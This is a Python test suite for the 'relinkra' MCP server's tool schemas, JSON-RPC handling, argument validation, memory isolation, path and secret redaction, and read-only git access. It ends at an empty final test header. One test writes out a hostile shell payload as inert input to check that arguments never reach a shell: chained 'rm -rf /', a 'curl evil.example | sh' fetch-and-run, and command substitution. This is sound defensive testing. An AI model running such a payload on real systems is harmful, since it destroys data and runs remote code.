"""Tests for the R3 MCP surface: schema, protocol, policy, degradation.

Offline and deterministic. The transport is exercised through
``MCPServer.handle_message`` / ``handle_line`` with an in-memory R1C
store, a duck-typed git service, and a frozen clock — no subprocess, no
Engram, no CBM, no real git. The live stdio proof lives in
``test_mcp_proof.py``.
"""

from __future__ import annotations

import json
import os
import re
import unittest
from pathlib import Path

from relinkra.app_service import (
    CONTRACT_VERSION,
    RelinkraServices,
    ServiceConfig,
)
from relinkra.context_packet import ContextPacket
from relinkra.freshness import RevisionRelation, RevisionRelationState
from relinkra.git_intelligence import (
    GitCapabilities,
    GitRepositoryState,
    GitWarning,
)
from relinkra.handoff import HANDOFF_VERSION, contains_absolute_path
from relinkra.mcp_server import (
    INVALID_PARAMS,
    INVALID_REQUEST,
    METHOD_NOT_FOUND,
    PARSE_ERROR,
    PREFERRED_PROTOCOL_VERSION,
    SERVER_NAME,
    SUPPORTED_PROTOCOL_VERSIONS,
    TOOLS,
    TOOLS_BY_NAME,
    MCPServer,
)
from relinkra.memory import MemoryStoreError
from relinkra.relevance import RELEVANCE_VERSION
from test_context_packet import FIXED_NOW, IDENTITY_B, Env

#: The identifier a host builds for an MCP tool. It must satisfy the
#: Anthropic tool-name pattern, which is why the surface uses
#: underscores rather than the dotted logical names.
HOST_TOOL_NAME_RE = re.compile(r"^[a-zA-Z0-9_-]{1,64}$")


class RecordingGitService:
    """Duck-typed GitIntelligenceService that logs every method used.

    Signatures and degradation mirror the real R2 service: ``collect_*``
    never raises at the boundary, it returns ``(None|[], [warning])``.
    Modelling that faithfully is what makes the degraded-mode tests
    meaningful — a fake that raised would exercise a path the real
    service never takes.
    """

    def __init__(self, fail=False):
        self.calls = []
        self.fail = fail

    def _guard(self, name):
        self.calls.append(name)
        return self.fail

    @staticmethod
    def _warning():
        return [GitWarning("git_unavailable", "git executable not found")]

    def collect_capabilities(self, path):
        if self._guard("collect_capabilities"):
            return (
                GitCapabilities(
                    git_available=False,
                    git_version=None,
                    repository_detected=False,
                    is_bare=False,
                    head_available=False,
                ),
                self._warning(),
            )
        return (
            GitCapabilities(
                git_available=True,
                git_version="2.55.0",
                repository_detected=True,
                is_bare=False,
                head_available=True,
            ),
            [],
        )

    def collect_repository_state(self, path, capabilities=None):
        if self._guard("collect_repository_state"):
            return None, self._warning()
        return (
            GitRepositoryState(
                head_sha="a" * 40,
                short_head_sha="a" * 7,
                branch="main",
                detached=False,
                clean=True,
                staged_count=0,
                unstaged_count=0,
                untracked_count=0,
                conflicted_count=0,
            ),
            [],
        )

    def collect_head_facts(self, path, state=None):
        if self._guard("collect_head_facts"):
            return None, self._warning()
        return None, []

    def collect_working_tree(self, path):
        if self._guard("collect_working_tree"):
            return None, self._warning()
        return None, []

    def collect_recent_commits(self, path, limit=10):
        if self._guard("collect_recent_commits"):
            return [], self._warning()
        return [], []

    def collect_diff(self, path, include_snippets=False):
        if self._guard("collect_diff"):
            return [], self._warning()
        return [], []

    def collect_file_history(self, path, file_path, limit=None):
        if self._guard("collect_file_history"):
            return [], self._warning()
        return [], []

    def collect_current_change_state(self, path, file_path):
        if self._guard("collect_current_change_state"):
            return None, self._warning()
        return None, []

    def collect_cochange(self, path, anchor_path):
        if self._guard("collect_cochange"):
            return [], self._warning()
        return [], []


class ExplodingGitService(RecordingGitService):
    """Unexpected adapter fault carrying data that must never reach output."""

    def collect_repository_state(self, path, capabilities=None):
        self.calls.append("collect_repository_state")
        raise RuntimeError(
            "token=private-token at C:\\Users\\alice\\secret-repository"
        )


class HistoricalRelationGitService(RecordingGitService):
    """Current Git plus a bounded relation for an older handoff revision."""

    def collect_revision_relation(self, path, evidence_revision, current_revision):
        self.calls.append("collect_revision_relation")
        return RevisionRelation(
            RevisionRelationState.ANCESTOR,
            distance=4,
        )


class BrokenStore:
    """A store whose every operation fails, simulating Engram down."""

    def save_record(self, **kwargs):
        raise MemoryStoreError("engram executable not found: engram")

    def search_records(self, **kwargs):
        raise MemoryStoreError("engram executable not found: engram")


class MCPTestCase(unittest.TestCase):
    """Base fixture: a registered project behind a live MCP server."""

    store = None
    git_service = None
    workspace_root = None

    def setUp(self):
        self.env = Env(seed=True)
        self.addCleanup(self.env.cleanup)
        self.git = self.git_service or RecordingGitService()
        self.services = RelinkraServices(
            config=ServiceConfig(
                registry_path=self.env.registry_path,
                default_project_id=self.env.project_id,
                default_workspace_id=self.env.workspace_id,
                workspace_root=self.workspace_root,
            ),
            store=self.store if self.store is not None else self.env.store,
            registry=self.env.registry,
            git_service=self.git,
            clock=lambda: FIXED_NOW,
        )
        self.server = MCPServer(self.services)

    # -- helpers ----------------------------------------------------------

    def rpc(self, method, params=None, message_id=1):
        message = {"jsonrpc": "2.0", "id": message_id, "method": method}
        if params is not None:
            message["params"] = params
        return self.server.handle_message(message)

    def call(self, name, **arguments):
        response = self.rpc(
            "tools/call", {"name": name, "arguments": arguments}
        )
        return response["result"]

    def ok(self, name, **arguments):
        result = self.call(name, **arguments)
        self.assertFalse(
            result["isError"],
            f"{name} failed: {result['content'][0]['text']}",
        )
        return result["structuredContent"]

    def err(self, name, **arguments):
        result = self.call(name, **arguments)
        self.assertTrue(result["isError"], f"{name} unexpectedly succeeded")
        return result["structuredContent"]["error"]

    def _foreign_workspace(self):
        """Register a SECOND project in the same registry.

        Two Env instances share one repository identity and therefore one
        project_id, so they cannot express cross-project isolation. A
        distinct identity is what actually creates a second project.
        """
        directory = os.path.join(self.env.tmp.name, "foreign")
        os.makedirs(directory, exist_ok=True)
        return self.env.registry.register_workspace(
            directory,
            IDENTITY_B,
            git={"branch": "main", "head_sha": "b" * 40},
        )


class SchemaTests(MCPTestCase):
    def test_expected_tool_surface(self):
        names = {tool["name"] for tool in TOOLS}
        self.assertEqual(
            names,
            {
                "project_resolve",
                "context_get",
                "memory_search",
                "memory_save",
                "code_resolve",
                "code_architecture",
                "code_relationships",
                "git_context",
                "handoff_create",
                "handoff_get",
                "health",
            },
        )

    def test_mcp_surface_docs_match_wire_tools(self):
        docs = (
            Path(__file__).resolve().parents[1] / "docs" / "mcp-surface.md"
        ).read_text(encoding="utf-8")
        documented = set(
            re.findall(
                r"^\| `([^`]+)` \| `relinkra\.[^`]+` \|",
                docs,
                re.MULTILINE,
            )
        )
        self.assertEqual(documented, {tool["name"] for tool in TOOLS})

    def test_tool_names_survive_host_namespacing(self):
        """A dotted name would break the host's tool-name pattern."""
        for tool in TOOLS:
            namespaced = f"mcp__relinkra__{tool['name']}"
            self.assertRegex(tool["name"], HOST_TOOL_NAME_RE)
            self.assertRegex(namespaced, HOST_TOOL_NAME_RE)
            self.assertNotIn(".", tool["name"])

    def test_every_tool_declares_a_usable_schema(self):
        for tool in TOOLS:
            schema = tool["inputSchema"]
            self.assertEqual(schema["type"], "object")
            self.assertIn("properties", schema)
            self.assertFalse(schema["additionalProperties"])
            self.assertTrue(tool["description"].strip())
            for name, spec in schema["properties"].items():
                self.assertIn("type", spec, f"{tool['name']}.{name}")
                self.assertIn("description", spec, f"{tool['name']}.{name}")

    def test_tools_list_is_serializable_and_stable(self):
        listed = self.rpc("tools/list")["result"]["tools"]
        self.assertEqual(len(listed), len(TOOLS))
        json.dumps(listed)
        again = self.rpc("tools/list")["result"]["tools"]
        self.assertEqual(listed, again)

    def test_tools_list_hides_internal_logical_name(self):
        for tool in self.rpc("tools/list")["result"]["tools"]:
            self.assertEqual(
                set(tool),
                {"name", "title", "description", "inputSchema", "annotations"},
            )


class ProtocolTests(MCPTestCase):
    def test_initialize_echoes_supported_version(self):
        for version in SUPPORTED_PROTOCOL_VERSIONS:
            result = self.rpc("initialize", {"protocolVersion": version})[
                "result"
            ]
            self.assertEqual(result["protocolVersion"], version)

    def test_initialize_falls_back_for_unknown_version(self):
        result = self.rpc("initialize", {"protocolVersion": "1999-01-01"})[
            "result"
        ]
        self.assertEqual(result["protocolVersion"], PREFERRED_PROTOCOL_VERSION)

    def test_initialize_reports_server_identity(self):
        result = self.rpc("initialize", {})["result"]
        self.assertEqual(result["serverInfo"]["name"], "relinkra")
        self.assertEqual(
            result["serverInfo"]["contractVersion"], CONTRACT_VERSION
        )
        self.assertIn("tools", result["capabilities"])

    def test_initialize_advertises_compact_project_guidance(self):
        instructions = self.rpc("initialize", {})["result"]["instructions"]
        self.assertIn("shared project context layer", instructions)
        self.assertIn("trivial", instructions)
        self.assertIn("stale", instructions)
        # Structural triggers must be explicit so a host model can match
        # real task phrasing to the surface.
        self.assertIn("architecture", instructions)
        self.assertIn("callers", instructions)
        self.assertIn("dependencies", instructions)
        self.assertIn("impact", instructions)
        self.assertIn("memory", instructions)
        self.assertIn("handoff continuity", instructions)
        self.assertIn("Git history", instructions)
        # Advisory, never compulsory: "prefer ... when useful" semantics,
        # native autonomy, and source verification stay explicit.
        self.assertIn("prefer checking", instructions)
        self.assertIn("Native search", instructions)
        self.assertIn("current source", instructions)

    def test_tool_descriptions_include_when_useful_cues(self):
        descriptions = {tool["name"]: tool["description"] for tool in TOOLS}
        self.assertIn("bounded project evidence", descriptions["context_get"])
        self.assertIn("prior decisions", descriptions["memory_search"])
        self.assertIn("callers", descriptions["code_relationships"])
        self.assertIn("recent changes", descriptions["git_context"])

    def test_tool_names_do_not_repeat_the_server_namespace(self):
        # Hosts prefix tool names with the server id ("relinkra"), so a
        # tool whose own name starts with that prefix would surface as a
        # redundant ``relinkra_relinkra_*`` double name.
        for tool in TOOLS:
            self.assertFalse(
                tool["name"].startswith(f"{SERVER_NAME}_"),
                f"{tool['name']} duplicates the server namespace",
            )

    def test_relationships_description_matches_structural_intents(self):
        description = TOOLS_BY_NAME["code_relationships"]["description"]
        for cue in ("callers", "callees", "dependencies", "dependents",
                    "impact", "cross-module"):
            self.assertIn(cue, description)
        self.assertIn("verify", description.lower())

    def test_architecture_description_matches_orientation_intents(self):
        description = TOOLS_BY_NAME["code_architecture"]["description"]
        for cue in ("architecture", "layers", "subsystems"):
            self.assertIn(cue, description)

    def test_context_description_conveys_bounded_evidence(self):
        description = TOOLS_BY_NAME["context_get"]["description"]
        self.assertIn("bounded", description)
        self.assertIn("reduce broad", description)
        self.assertIn("not needed for", description)

    def test_memory_and_handoff_descriptions_express_continuity(self):
        memory = TOOLS_BY_NAME["memory_search"]["description"]
        self.assertIn("previous findings", memory)
        self.assertIn("project knowledge", memory)
        handoff = TOOLS_BY_NAME["handoff_get"]["description"]
        self.assertIn("resuming", handoff)
        self.assertIn("continuing another agent", handoff)

    def test_git_and_health_descriptions_match_their_questions(self):
        git = TOOLS_BY_NAME["git_context"]["description"]
        self.assertIn("when or why code changed", git)
        self.assertIn("history", git)
        health = TOOLS_BY_NAME["health"]["description"]
        self.assertIn("troubleshoot", health)
        self.assertIn("availability", health)

    def test_annotations_truthfully_mark_read_only_tools(self):
        by_name = {tool["name"]: tool for tool in TOOLS}
        read_only = {
            "project_resolve", "context_get", "memory_search",
            "code_resolve", "code_architecture", "code_relationships",
            "git_context", "handoff_get", "health",
        }
        for tool in self.rpc("tools/list")["result"]["tools"]:
            expected = tool["name"] in read_only
            self.assertEqual(
                tool["annotations"]["readOnlyHint"],
                expected,
                tool["name"],
            )
            self.assertEqual(tool["annotations"]["readOnlyHint"],
                             by_name[tool["name"]]["read_only"])

    def test_trivial_work_is_not_described_as_requiring_relinkra(self):
        instructions = self.rpc("initialize", {})["result"]["instructions"]
        self.assertIn("Do not use it for trivial", instructions)
        context = TOOLS_BY_NAME["context_get"]["description"]
        self.assertIn("not needed for", context)

    def test_ping(self):
        self.assertEqual(self.rpc("ping")["result"], {})

    def test_notification_gets_no_response(self):
        message = {"jsonrpc": "2.0", "method": "notifications/initialized"}
        self.assertIsNone(self.server.handle_message(message))

    def test_unknown_notification_is_ignored(self):
        message = {"jsonrpc": "2.0", "method": "notifications/from_the_future"}
        self.assertIsNone(self.server.handle_message(message))

    def test_unknown_method_returns_method_not_found(self):
        response = self.rpc("does/not/exist")
        self.assertEqual(response["error"]["code"], METHOD_NOT_FOUND)

    def test_malformed_json_returns_parse_error(self):
        response = self.server.handle_line("{not json")
        self.assertEqual(response["error"]["code"], PARSE_ERROR)

    def test_wrong_jsonrpc_version_is_rejected(self):
        response = self.server.handle_line(
            json.dumps({"jsonrpc": "1.0", "id": 1, "method": "ping"})
        )
        self.assertEqual(response["error"]["code"], INVALID_REQUEST)

    def test_batch_requests_are_rejected(self):
        response = self.server.handle_line(json.dumps([{"jsonrpc": "2.0"}]))
        self.assertEqual(response["error"]["code"], INVALID_REQUEST)

    def test_non_object_params_are_rejected(self):
        response = self.server.handle_line(
            json.dumps(
                {"jsonrpc": "2.0", "id": 3, "method": "ping", "params": [1, 2]}
            )
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_response_id_is_echoed(self):
        self.assertEqual(self.rpc("ping", message_id=77)["id"], 77)

    def test_unknown_tool_is_a_protocol_error(self):
        response = self.rpc("tools/call", {"name": "relinkra_delete_repo"})
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_tools_call_requires_a_name(self):
        response = self.rpc("tools/call", {"arguments": {}})
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)


class ArgumentValidationTests(MCPTestCase):
    def test_unknown_argument_is_rejected(self):
        response = self.rpc(
            "tools/call",
            {"name": "health", "arguments": {"rm": "-rf"}},
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)
        self.assertIn("unknown argument", response["error"]["message"])

    def test_missing_required_argument_is_rejected(self):
        response = self.rpc(
            "tools/call",
            {"name": "handoff_create", "arguments": {"task": "x"}},
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_wrong_type_is_rejected(self):
        response = self.rpc(
            "tools/call",
            {
                "name": "memory_search",
                "arguments": {"limit": "twelve"},
            },
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_boolean_is_not_accepted_as_integer(self):
        response = self.rpc(
            "tools/call",
            {"name": "memory_search", "arguments": {"limit": True}},
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_out_of_range_integer_is_rejected(self):
        response = self.rpc(
            "tools/call",
            {"name": "memory_search", "arguments": {"limit": 9999}},
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_enum_violation_is_rejected(self):
        response = self.rpc(
            "tools/call",
            {
                "name": "context_get",
                "arguments": {"budget": "gigantic"},
            },
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_array_element_type_is_enforced(self):
        response = self.rpc(
            "tools/call",
            {
                "name": "handoff_create",
                "arguments": {
                    "source_agent": "a",
                    "task": "t",
                    "pending_work": [1, 2, 3],
                },
            },
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_arguments_must_be_an_object(self):
        response = self.rpc(
            "tools/call",
            {"name": "health", "arguments": "not-an-object"},
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_shell_metacharacters_are_inert_data(self):
        """Malformed input must never reach a shell. It is just a string."""
        payload = "; rm -rf / && curl evil.example | sh `whoami` $(id)"
        result = self.ok(
            "handoff_create",
            source_agent="opencode",
            task=payload,
            include_git_state=False,
        )
        self.assertIn("handoff", result)


class ToolBehaviourTests(MCPTestCase):
    workspace_root = "."

    def test_structural_tools_degrade_without_cbm(self):
        architecture = self.ok("code_architecture")
        self.assertFalse(architecture["available"])
        self.assertTrue(architecture["advisory_only"])
        self.assertTrue(architecture["native_tools_remain_available"])
        self.assertEqual(architecture["freshness"]["state"], "unknown")

        relationships = self.ok(
            "code_relationships", symbol="Target"
        )
        self.assertFalse(relationships["available"])
        self.assertTrue(relationships["advisory_only"])
        self.assertTrue(relationships["native_tools_remain_available"])
        self.assertEqual(relationships["evidence"], None)

    def test_structural_tool_surface_does_not_expose_cbm_schema(self):
        for name in ("code_architecture", "code_relationships"):
            tool = next(item for item in TOOLS if item["name"] == name)
            rendered = json.dumps(tool, sort_keys=True).lower()
            self.assertNotIn("cypher", rendered)
            self.assertNotIn("trace_path", rendered)
            self.assertNotIn("get_architecture", rendered)

    def test_structural_tools_return_portable_high_level_evidence(self):
        class StructuralCBM:
            def code_evidence_authority(self):
                return {
                    "index_status": {"git": {"head_sha": "a" * 40}},
                    "trust_stages": [{"name": "CBM graph", "status": "PASS"}],
                }

            def architecture_orientation(self, **kwargs):
                return {
                    "total_nodes": 2,
                    "total_edges": 1,
                    "layers": [{"layer": "api", "name": "routes", "reason": "entry"}],
                }

            def search_symbols(self, **kwargs):
                return [{
                    "qualified_name": "C-Desarrollos-relinkra-ws.src.Target",
                    "relative_qualified_name": "src.Target",
                }]

            def trace_relationships(self, **kwargs):
                return {
                    "target": "src.Target",
                    "direction": kwargs["direction"],
                    "max_hops": kwargs["max_hops"],
                    "relationships": [{
                        "relationship": "caller",
                        "name": "Caller",
                        "qualified_name": "src.Caller",
                        "hop": 1,
                    }],
                    "coverage": {
                        "complete": False,
                        "qualification": "bounded graph result may be incomplete",
                    },
                }

        self.services.cbm_adapter = StructuralCBM()
        architecture = self.ok("code_architecture")
        relationships = self.ok(
            "code_relationships", symbol="Target", direction="inbound"
        )
        self.assertTrue(architecture["available"])
        self.assertTrue(relationships["available"])
        self.assertEqual(relationships["evidence"]["relationships"][0]["relationship"], "caller")
        rendered = json.dumps({"architecture": architecture, "relationships": relationships})
        self.assertNotIn("C-Desarrollos-relinkra-ws", rendered)
        self.assertNotIn("trace_path", rendered)
        self.assertTrue(relationships["native_tools_remain_available"])

    def test_project_resolve(self):
        payload = self.ok("project_resolve")
        self.assertEqual(payload["project_id"], self.env.project_id)
        self.assertIn("repository_identity", payload)

    def test_project_resolve_rejects_foreign_workspace(self):
        """A workspace of ANOTHER project must not resolve under this one."""
        foreign = self._foreign_workspace()
        error = self.err(
            "project_resolve", workspace_id=foreign.workspace_id
        )
        self.assertEqual(error["code"], "project_mismatch")

    def test_project_resolve_warns_on_unknown_workspace(self):
        payload = self.ok(
            "project_resolve", workspace_id="ws_" + "0" * 32
        )
        codes = [w["code"] for w in payload["warnings"]]
        self.assertIn("workspace_not_registered", codes)

    def test_context_get_is_deterministic(self):
        first = self.ok("context_get", task="auth work")
        second = self.ok("context_get", task="auth work")
        self.assertEqual(first["packet_id"], second["packet_id"])
        self.assertEqual(first["packet"], second["packet"])

    def test_context_get_under_budget_and_relevance(self):
        payload = self.ok(
            "context_get",
            task="auth work",
            budget="small",
            rank=True,
        )
        self.assertIn("budget_report", payload)
        report = payload["budget_report"]
        self.assertTrue(report["satisfied"])
        self.assertLessEqual(
            report["final_usage"]["estimated_tokens"],
            report["budget"]["max_estimated_tokens"],
        )
        self.assertTrue(
            payload["packet"]["diagnostics"]["relevance"]["ranked"]
        )
        self.assertEqual(report["relevance_version"], RELEVANCE_VERSION)
        final_packet = ContextPacket.from_dict(payload["packet"])
        self.assertEqual(
            report["final_usage"]["total_chars"],
            final_packet.diagnostics["budget"]["final_total_chars"],
        )
        self.assertGreaterEqual(
            report["final_usage"]["total_chars"], len(final_packet.to_json())
        )
        self.assertEqual(
            report["final_usage"]["estimated_tokens"],
            final_packet.diagnostics["budget"]["final_estimated_tokens"],
        )
        # The packet is returned once, not embedded twice.
        self.assertNotIn("packet", report)

    def test_r4d_read_surfaces_are_enriched_end_to_end(self):
        context = self.ok("context_get", task="auth work")
        packet = context["packet"]
        self.assertTrue(packet["explainability"]["advisory_only"])
        self.assertTrue(
            all(
                "explain" in item
                for section in (
                    "memories",
                    "pending",
                    "handoffs",
                    "code_references",
                    "code_facts",
                    "git_facts",
                )
                for item in packet.get(section, [])
            )
        )

        memories = self.ok("memory_search", query="auth")
        self.assertTrue(memories["explainability"]["advisory_only"])
        self.assertTrue(memories["memories"])
        self.assertIn("freshness", memories["memories"][0]["explain"])

        code = self.ok("code_resolve", file="src/auth.py")
        self.assertTrue(code["explainability"]["advisory_only"])
        self.assertTrue(
            all(
                "explain" in item
                for section in ("code_references", "code_facts")
                for item in code[section]
            )
        )

        created = self.ok(
            "handoff_create",
            source_agent="opencode",
            task="R4D surface handoff",
            include_git_state=False,
        )["handoff"]
        fetched = self.ok(
            "handoff_get", handoff_id=created["handoff_id"]
        )["handoff"]
        self.assertIn("freshness", fetched["explain"])

    def test_targeted_historical_handoff_is_enriched_without_mutating_storage(self):
        historical_id = "hof_6d1bbdcd2ea6a19f15e412050be67950"
        historical_revision = "b" * 40
        body = {
            "handoff_version": HANDOFF_VERSION,
            "handoff_id": historical_id,
            "project_id": self.env.project_id,
            "workspace_id": None,
            "source_agent": "opencode",
            "target_agent": "codex",
            "task": "Resume the historical R4D work unit",
            "summary": "Faithful offline fixture for the stored handoff.",
            "completed_work": ["captured the prior state"],
            "pending_work": ["verify current code"],
            "decisions": ["keep history append-only"],
            "warnings": [],
            "related_memory_ids": [],
            "related_code_reference_ids": [],
            "git_state": {
                "branch": "historical-r4d",
                "head_sha": historical_revision,
                "short_head_sha": historical_revision[:7],
                "detached": False,
                "clean": True,
                "counts": {
                    "staged": 0,
                    "unstaged": 0,
                    "untracked": 0,
                    "conflicted": 0,
                },
            },
            "context_packet_id": None,
            "supersedes": None,
            "provenance": {
                "producer": "relinkra.handoff",
                "handoff_version": HANDOFF_VERSION,
                "scope": "project_shared",
            },
        }
        stored = self.env.save(
            memory_type="handoff",
            title="historical R4D handoff fixture",
            body=json.dumps(body, sort_keys=True),
            status="superseded",
            branch="historical-r4d",
            commit_sha=historical_revision,
        )
        before_records = tuple(
            (record.record_id, record.title, record.content)
            for record in self.env.store._records
        )
        before_writes = tuple(
            (entry["title"], entry["content"], entry["topic_key"])
            for entry in self.env.store.saved_args
        )
        self.services.config.workspace_root = self.env.ws_dir
        self.services.git_service = HistoricalRelationGitService()

        fetched = self.ok(
            "handoff_get", handoff_id=historical_id
        )["handoff"]

        self.assertEqual(fetched["handoff_version"], HANDOFF_VERSION)
        self.assertEqual(fetched["handoff_id"], historical_id)
        self.assertEqual(fetched["project_id"], self.env.project_id)
        self.assertIsNone(fetched["workspace_id"])
        self.assertEqual(fetched["source_agent"], "opencode")
        self.assertEqual(fetched["target_agent"], "codex")
        self.assertEqual(fetched["task"], body["task"])
        self.assertEqual(fetched["summary"], body["summary"])
        self.assertEqual(fetched["git_state"], body["git_state"])
        self.assertEqual(fetched["status"], "superseded")
        self.assertEqual(fetched["memory_id"], stored.memory_id)
        freshness = fetched["explain"]["freshness"]
        self.assertEqual(freshness["state"], "stale")
        self.assertEqual(freshness["reason_code"], "revision_stale")
        self.assertEqual(freshness["source_revision"], historical_revision)
        self.assertEqual(freshness["current_revision"], "a" * 40)
        self.assertTrue(freshness["recommended_action"])
        self.assertTrue(fetched["explain"]["trust"]["advisory_only"])
        self.assertEqual(
            tuple(
                (record.record_id, record.title, record.content)
                for record in self.env.store._records
            ),
            before_records,
        )
        self.assertEqual(
            tuple(
                (entry["title"], entry["content"], entry["topic_key"])
                for entry in self.env.store.saved_args
            ),
            before_writes,
        )

    def test_context_get_rejects_unsatisfiable_budget(self):
        error = self.err("context_get", task="auth", max_tokens=1)
        self.assertEqual(error["code"], "invalid_input")

    def test_context_get_markdown(self):
        payload = self.ok(
            "context_get", task="auth work", format="markdown"
        )
        self.assertIn("RELINKRA CONTEXT", payload["markdown"])
        self.assertNotIn("packet", payload)

    def test_context_get_includes_handoffs(self):
        created = self.ok(
            "handoff_create",
            source_agent="opencode",
            target_agent="claude",
            task="auth work continues",
            include_git_state=False,
        )["handoff"]
        payload = self.ok("context_get", task="auth work continues")
        handoff_bodies = [
            item["data"].get("body", "")
            for item in payload["packet"]["handoffs"]
        ]
        self.assertTrue(
            any(created["handoff_id"] in body for body in handoff_bodies),
            "handoff did not reach the context packet",
        )

    def test_memory_save_then_search(self):
        saved = self.ok(
            "memory_save",
            memory_type="decision",
            title="Adopt MCP stdio transport",
            body="JSON-RPC over stdio, stdlib only.",
        )
        self.assertFalse(saved["deduplicated"])
        found = self.ok("memory_search", query="stdio", limit=20)
        titles = [m["title"] for m in found["memories"]]
        self.assertIn("Adopt MCP stdio transport", titles)

    def test_memory_save_is_idempotent(self):
        args = dict(
            memory_type="constraint", title="No third-party deps", body="x"
        )
        first = self.ok("memory_save", **args)
        second = self.ok("memory_save", **args)
        self.assertFalse(first["deduplicated"])
        self.assertTrue(second["deduplicated"])

    def test_memory_save_rejects_unknown_type(self):
        response = self.rpc(
            "tools/call",
            {
                "name": "memory_save",
                "arguments": {"memory_type": "gossip", "title": "t"},
            },
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_code_resolve_degrades_without_index(self):
        payload = self.ok("code_resolve", file="src/auth.py")
        self.assertEqual(payload["project_id"], self.env.project_id)
        self.assertIn("code_references", payload)
        self.assertNotIn("cbm_project_name", json.dumps(payload))

    def test_handoff_create_and_get(self):
        created = self.ok(
            "handoff_create",
            source_agent="opencode",
            target_agent="claude",
            task="Port the parser",
            pending_work=["error recovery"],
            include_git_state=False,
        )["handoff"]
        fetched = self.ok(
            "handoff_get", handoff_id=created["handoff_id"]
        )["handoff"]
        self.assertEqual(fetched["handoff_id"], created["handoff_id"])
        self.assertEqual(fetched["pending_work"], ["error recovery"])

    def test_handoff_get_unknown_id(self):
        error = self.err("handoff_get", handoff_id="hof_" + "0" * 32)
        self.assertEqual(error["code"], "not_found")

    def test_handoff_get_malformed_id(self):
        error = self.err("handoff_get", handoff_id="nope")
        self.assertEqual(error["code"], "invalid_input")

    def test_health_reports_contract_and_components(self):
        payload = self.ok("health")
        self.assertEqual(payload["contract_version"], CONTRACT_VERSION)
        self.assertIn("engram", payload["components"])
        self.assertIn("cbm", payload["components"])
        self.assertIn("git", payload["components"])
        self.assertIn("handoff", payload["schema_versions"])
        self.assertFalse(payload["capabilities"]["agent_private_access"])
        self.assertFalse(payload["capabilities"]["git_write"])


class PolicyIsolationTests(MCPTestCase):
    def test_agent_private_memory_is_never_searchable(self):
        private = self.env.save(
            memory_type="discovery",
            title="private scratchpad",
            body="do-not-share",
            scope="agent_private",
            agent_type="claude",
        )
        found = self.ok("memory_search", limit=100)
        ids = [m["memory_id"] for m in found["memories"]]
        self.assertNotIn(private.memory_id, ids)
        self.assertNotIn("do-not-share", json.dumps(found))

    def test_agent_private_scope_is_not_writable(self):
        response = self.rpc(
            "tools/call",
            {
                "name": "memory_save",
                "arguments": {
                    "memory_type": "discovery",
                    "title": "t",
                    "scope": "agent_private",
                },
            },
        )
        self.assertEqual(response["error"]["code"], INVALID_PARAMS)

    def test_agent_private_never_reaches_a_context_packet(self):
        self.env.save(
            memory_type="decision",
            title="private decision",
            body="do-not-share",
            scope="agent_private",
            agent_type="claude",
        )
        payload = self.ok("context_get", task="private decision")
        self.assertNotIn("do-not-share", json.dumps(payload))

    def test_cross_project_memory_never_leaks(self):
        """A second project sharing the SAME store stays invisible."""
        foreign = self._foreign_workspace()
        self.env.service.save(
            project_id=foreign.project_id,
            memory_type="decision",
            title="other project secret",
            body="do-not-share",
            repository_identity={
                "kind": IDENTITY_B.kind,
                "value": IDENTITY_B.value,
                "trust": IDENTITY_B.trust,
            },
        )
        found = self.ok("memory_search", limit=100)
        self.assertNotIn("other project secret", json.dumps(found))
        self.assertNotIn("do-not-share", json.dumps(found))
        packet = self.ok("context_get", task="other project secret")
        self.assertNotIn("do-not-share", json.dumps(packet))

    def test_source_agent_confers_no_authority(self):
        """Claiming to be another agent must not widen visibility."""
        self.env.save(
            memory_type="discovery",
            title="claude private",
            body="do-not-share",
            scope="agent_private",
            agent_type="claude",
        )
        payload = self.ok(
            "context_get",
            task="claude private",
            requesting_agent="claude",
        )
        self.assertNotIn("do-not-share", json.dumps(payload))


class PortableOutputTests(MCPTestCase):
    workspace_root = "."

    def _assert_portable(self, payload):
        blob = json.dumps(payload)
        for match in re.findall(r'"[^"]*"', blob):
            value = match[1:-1].replace("\\\\", "\\")
            self.assertFalse(
                contains_absolute_path(value),
                f"absolute path leaked: {value!r}",
            )

    def test_context_packet_is_portable(self):
        payload = self.ok("context_get", task="auth")
        self._assert_portable(payload)
        self.assertNotIn("cbm_project_name", json.dumps(payload))

    def test_health_is_portable(self):
        payload = self.ok("health")
        self._assert_portable(payload)
        # The root is reported as a boolean, never as a value.
        self.assertIsInstance(payload["workspace_root_configured"], bool)
        self.assertNotIn("workspace_root", payload)

    def test_project_resolve_is_portable(self):
        payload = self.ok("project_resolve")
        self._assert_portable(payload)
        self.assertNotIn("absolute_path", json.dumps(payload))
        self.assertNotIn("canonical_path", json.dumps(payload))
        self.assertNotIn("cbm_project_name", json.dumps(payload))

    def test_handoff_is_portable(self):
        payload = self.ok(
            "handoff_create",
            source_agent="opencode",
            task="work in C:\\Users\\me\\repo",
            summary="also /home/me/repo",
            include_git_state=True,
        )
        self._assert_portable(payload)

    def test_no_secret_survives_a_handoff(self):
        payload = self.ok(
            "handoff_create",
            source_agent="opencode",
            task="rotate the key",
            summary="token is Bearer sk-live-0123456789abcdefghij",
            include_git_state=False,
        )
        self.assertNotIn("sk-live-0123456789abcdefghij", json.dumps(payload))


class GitReadOnlyTests(MCPTestCase):
    workspace_root = "."

    def test_git_context_uses_only_collect_verbs(self):
        self.ok("git_context", file="README.md")
        self.assertTrue(self.git.calls)
        for call in self.git.calls:
            self.assertTrue(
                call.startswith("collect_"),
                f"non-read-only git call: {call}",
            )

    #: The complete read-only surface of the R2 git service. An allowlist
    #: rather than a forbidden-substring check, because a legitimate name
    #: like ``collect_recent_commits`` contains "commit".
    READ_ONLY_GIT_METHODS = frozenset(
        {
            "collect_capabilities",
            "collect_repository_state",
            "collect_head_facts",
            "collect_working_tree",
            "collect_recent_commits",
            "collect_diff",
            "collect_file_history",
            "collect_current_change_state",
            "collect_cochange",
        }
    )

    def test_whole_surface_never_mutates_git(self):
